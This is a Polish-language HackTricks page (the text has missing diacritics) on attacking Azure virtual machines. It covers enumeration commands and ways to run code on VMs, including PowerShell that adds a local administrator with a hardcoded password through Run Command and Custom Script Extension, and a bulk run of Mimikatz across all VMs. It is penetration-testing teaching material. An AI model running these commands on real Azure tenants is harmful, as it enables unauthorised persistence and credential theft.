# Az - Maszyny wirtualne i sie

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Maszyny wirtualne Azure s jednym z wielu rodzaj贸w [na 偶danie, skalowalnych zasob贸w obliczeniowych](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree), kt贸re oferuje Azure. Zazwyczaj wybierasz maszyn wirtualn, gdy potrzebujesz wikszej kontroli nad rodowiskiem obliczeniowym ni偶 oferuj inne opcje. Ten artyku zawiera informacje na temat tego, co powiniene wzi pod uwag przed utworzeniem maszyny wirtualnej, jak j utworzy i jak ni zarzdza.

## Informacje o sieci Azure

Sieci Azure zawieraj **r贸偶ne jednostki i sposoby ich konfiguracji**. Mo偶esz znale藕 kr贸tkie **opisy**, **przykady** i **polecenia wyliczajce** r贸偶ne jednostki sieciowe Azure w:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** oferuje bezpieczne, w peni zarzdzane rozwizanie dostpu RDP (Remote Desktop Protocol) i SSH (Secure Shell) przez SSL za porednictwem portalu Azure. Jest zintegrowany w ramach wirtualnej sieci Azure, umo偶liwiajc dostp RDP i SSH do maszyn wirtualnych za pomoc prywatnych adres贸w IP, eliminujc potrzeb publicznych adres贸w IP. Jest to bezpieczniejsza i bardziej wygodna alternatywa dla tradycyjnych metod, kt贸re wymagaj przypisywania publicznych adres贸w IP i konfiguracji regu NSG dla dostpu do maszyn wirtualnych. Programici i personel IT mog bezpiecznie uzyskiwa dostp do maszyn wirtualnych z portalu Azure za pomoc przegldarek internetowych, co usprawnia proces tworzenia i testowania rodowisk.

Aby wywietli wszystkie hosty Azure Bastion w swojej subskrypcji, mo偶na u偶y nastpujcego polecenia:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Wyliczanie maszyn wirtualnych

### Wyliczanie maszyn wirtualnych

Aby rozpocz test penetracyjny na maszynach wirtualnych w usudze Azure, nale偶y najpierw przeprowadzi wyliczanie maszyn wirtualnych. Wyliczanie to polega na identyfikacji i zbieraniu informacji na temat dostpnych maszyn wirtualnych w celu dalszej analizy i ataku.

### Wykorzystanie Azure CLI

Azure CLI jest narzdziem wiersza polece, kt贸re mo偶na wykorzysta do wyliczania maszyn wirtualnych w usudze Azure. Aby to zrobi, wykonaj nastpujce kroki:

1. Zainstaluj Azure CLI na swoim systemie.
2. Zaloguj si do swojego konta Azure przy u偶yciu polecenia `az login`.
3. Wykonaj polecenie `az vm list` w celu wylistowania wszystkich maszyn wirtualnych w swoim subskrypcji Azure.

### Wykorzystanie Azure Portal

Azure Portal to interfejs graficzny, kt贸ry umo偶liwia zarzdzanie usugami Azure, w tym maszynami wirtualnymi. Aby wyliczy maszyny wirtualne za pomoc Azure Portal, wykonaj nastpujce kroki:

1. Zaloguj si do Azure Portal przy u偶yciu swojego konta Azure.
2. Przejd藕 do sekcji "Maszyny wirtualne" i wybierz odpowiedni subskrypcj.
3. Wywietl list dostpnych maszyn wirtualnych i kliknij na wybran maszyn, aby uzyska wicej informacji.

### Wykorzystanie Azure PowerShell

Azure PowerShell to modu PowerShell, kt贸ry umo偶liwia zarzdzanie usugami Azure. Aby wyliczy maszyny wirtualne za pomoc Azure PowerShell, wykonaj nastpujce kroki:

1. Zainstaluj modu Azure PowerShell na swoim systemie.
2. Zaloguj si do swojego konta Azure przy u偶yciu polecenia `Connect-AzAccount`.
3. Wykonaj polecenie `Get-AzVM` w celu wylistowania wszystkich maszyn wirtualnych w swojej subskrypcji Azure.

### Wykorzystanie Azure REST API

Azure REST API to interfejs programistyczny, kt贸ry umo偶liwia komunikacj z usugami Azure za pomoc 偶da HTTP. Aby wyliczy maszyny wirtualne za pomoc Azure REST API, wykonaj nastpujce kroki:

1. Uzyskaj token dostpu do Azure AD za pomoc 偶dania `POST` do `https://login.microsoftonline.com/{tenant}/oauth2/token`.
2. Wykonaj 偶danie `GET` do `https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.Compute/virtualMachines?api-version=2020-06-01` z nag贸wkiem `Authorization` zawierajcym token dostpu.

### Analiza wynik贸w

Po przeprowadzeniu wyliczania maszyn wirtualnych, nale偶y przeanalizowa zebrane informacje w celu identyfikacji potencjalnych cel贸w ataku. Mo偶na zwr贸ci uwag na takie informacje jak nazwy maszyn, adresy IP, systemy operacyjne, otwarte porty itp. Te informacje mog by wykorzystane do dalszych etap贸w testu penetracyjnego.
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Wykonaj polecenia w maszynie wirtualnej**

### **Logowanie AAD w maszynie wirtualnej**

Mo偶liwe jest umo偶liwienie dostpu u偶ytkownikom uwierzytelnionym za pomoc AzureAD. Na przykad, pr贸bujc uzyska dostp do **maszyny wirtualnej Linux**: `ssh username@azure-corp.com@1.1.1.1` (wa偶ne jest **u偶ycie adresu e-mail** z azurecorp podczas pr贸by logowania), mo偶esz otrzyma bd:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Po prostu **postpuj zgodnie z tymi instrukcjami**, przechodzc do [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i podajc kod, u偶yj adresu e-mail i hasa jako powiadcze, a bdziesz m贸g poczy si za pomoc SSH (jeli ten u偶ytkownik ma wystarczajce uprawnienia do tego: rola `Virtual Machine Administrator Login` lub `Virtual Machine User Login`).

### **Uruchom polecenie**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Uruchom rozszerzenie skryptu niestandardowego**

Rozszerzenia maszyn wirtualnych (VM) w Azure to **mae aplikacje**, kt贸re dostarczaj konfiguracj po wdro偶eniu i automatyzacj **zada** na **maszynach wirtualnych Azure**. Na przykad, jeli maszyna wirtualna wymaga instalacji oprogramowania, ochrony antywirusowej lub mo偶liwoci uruchomienia skryptu w jej wntrzu, mo偶na u偶y rozszerzenia VM.

Dlatego, jeli masz dostp do zapisania go, mo偶esz wykona dowolny kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) to narzdzie PowerShell podobne do Ansible, u偶ywane do konfiguracji hosta za pomoc kodu. DSC integruje si z Azure, umo偶liwiajc przesyanie okrelonych plik贸w konfiguracyjnych. Pliki te musz by zgodne z cile okrelon skadni. Warto zauwa偶y, 偶e rozszerzenie DSC w Azure mo偶e wykonywa polecenia z plik贸w, kt贸re speniaj okrelone kryteria formatowania, nawet jeli skadnia nie jest poprawna zgodnie ze standardami DSC, jak pokazano na dostarczonym obrazku.

Wykonanie tych polece uatwia funkcja [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) w Az PowerShell. Wymagania obejmuj plik **.PS1** z zdefiniowan funkcj, kt贸ry musi by spakowany do pliku **.zip**. Nawet jeli skadnia mo偶e nie by poprawna dla DSC, kod i tak zostanie wykonany. Jednak rozszerzenie oznaczy status wykonania jako "niepowodzenie", a brak wynik贸w polecenia bdzie widoczny ze wzgldu na nadpisanie statusu przez komunikat o niepowodzeniu.

### Definicje aplikacji VM

Definicje aplikacji VM umo偶liwiaj powtarzalne wdra偶anie wersjonowanych aplikacji na maszynie wirtualnej Azure. Ten zas贸b obsuguje wdra偶anie i aktualizacj aplikacji na maszynach wirtualnych. Aby to skonfigurowa, konieczne jest wykonanie kilku krok贸w, w tym u偶ycie polece takich jak **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** w Az PowerShell.

Wykonanie aplikacji lub polece za pomoc tej metody obejmuje u偶ycie rozszerzenia **"VMAppExtension"**, kt贸re jest automatycznie instalowane, gdy aplikacja jest stosowana na maszynie wirtualnej. Rozszerzenie pobiera plik z okrelonego adresu URI i nadaje mu dokadnie tak sam nazw jak aplikacja, bez rozszerzenia. Aby poprawnie wykona plik, pole "ManageActions" w wywoaniu interfejsu API REST musi by skonfigurowane tak, aby zmieni nazw pliku na odpowiednie rozszerzenie. Po zakoczeniu konfiguracji ta metoda bdzie przypomina struktur pokazan na dostarczonym obrazku.

Jednak ta metoda wykonania jest stosunkowo wolna i zajmuje okoo 3-4 minut na wykonanie aplikacji lub polecenia. Pliki zwizane z tym procesem s przechowywane w okrelonych katalogach (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` dla kopii aplikacji i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` dla statusu wykonania).

Obie techniki zapewniaj unikalne sposoby wykonywania polece i wdra偶ania aplikacji w rodowiskach Azure, z wasnym zestawem wymaga, krok贸w i uwag.

### Grupy hybrydowe pracownik贸w (HWG) w Azure

[**Grupy hybrydowe pracownik贸w (HWG)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) to funkcja w Azure, kt贸ra umo偶liwia wykonywanie skrypt贸w uruchamianych w koncie automatyzacji na maszynie wirtualnej Azure (VM), kt贸ra jest czci wyznaczonej grupy HWG. Wykonanie to jest uatwiane przez rozszerzenie zainstalowane na VM, kt贸re implementuje kod skryptu na VM. Istotnym aspektem tego procesu jest to, 偶e faktyczne powiadczenia nie maj znaczenia podczas wykonywania, poniewa偶 kod dziaa z podwy偶szonymi uprawnieniami, konkretnie jako **SYSTEM** lub root, jak pokazano na dostarczonym obrazku.

Wa偶nym szczeg贸em dla os贸b korzystajcych z maszyn wirtualnych z systemem Windows 10 jest konieczno okrelenia wersji PowerShell dla skryptu. Powinna by ustawiona na wersj PowerShell 5.1 zamiast 7.1. Wymaganie to wynika z faktu, 偶e PowerShell 7.1 nie jest domylnie zainstalowany na tych maszynach, co prowadzi do niepowodzenia wykonania skryptu, jeli okrelono wersj 7.1.

Ta funkcja Azure oferuje solidny spos贸b na automatyzacj i zarzdzanie zadaniami w rodowiskach hybrydowych, umo偶liwiajc scentralizowane zarzdzanie i wykonywanie zada na maszynach wirtualnych Azure.


## Odwoania

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
